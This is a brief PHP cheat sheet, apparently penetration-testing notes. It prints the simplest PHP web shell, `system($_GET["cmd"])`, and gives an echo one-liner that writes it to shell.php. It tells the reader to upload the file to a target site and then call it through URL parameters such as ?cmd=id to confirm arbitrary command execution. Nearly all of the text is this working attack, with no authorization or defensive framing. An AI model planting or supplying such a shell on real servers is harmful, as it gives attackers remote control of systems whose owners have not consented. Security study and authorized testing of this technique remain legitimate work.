# PHP Quick Reference

## Contents
- []()
- []()
- []()
- []()
- []()
- []()
- []()

## One-Liner: cmd
- This is a PHP function that is used to execute a command.
- It uses the PHP `system()` function to execute commands that are being passed through `cmd` HTTP request `GET` parameter.
- The `cmd` is a parameter. You pass the argument to that parameter via the URL (see below).

### Syntax
- This is the PHP web shell in its most simple form: 
```
<?php system($_GET["cmd"]); ?>
```

### Use as a Test
- Create a PHP file and upload it to a target site that's running PHP:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
- Build a URL to execute that script with a command (specific to the operating system o/s).
- If you get a response from the command you send to the o/s via the PHP `system()` function, you know you can execute arbitrary code on the target.
```
# for Linux:
http://[target domain]/shell.php?cmd=id

# for Windows:
http://[target domain]/shell.php?cmd=dir
```

